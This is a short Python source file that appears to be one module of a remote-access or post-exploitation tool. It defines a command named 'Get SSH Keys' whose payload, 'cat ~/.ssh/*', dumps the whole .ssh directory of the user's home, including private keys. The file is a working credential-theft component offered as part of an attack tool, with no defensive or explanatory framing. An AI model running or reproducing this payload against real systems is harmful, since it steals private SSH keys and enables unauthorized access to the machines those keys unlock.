
from clients.command import CMD

class CommandGetSSHKeys(CMD):

    def __init__(self):
        super(CommandGetSSHKeys, self).__init__(
              "Get SSH Keys",
              "getsshkeys",
              "Dumps all contents of the .ssh directory in the home directory.")

    def get_payload(self):
        return "cat ~/.ssh/*"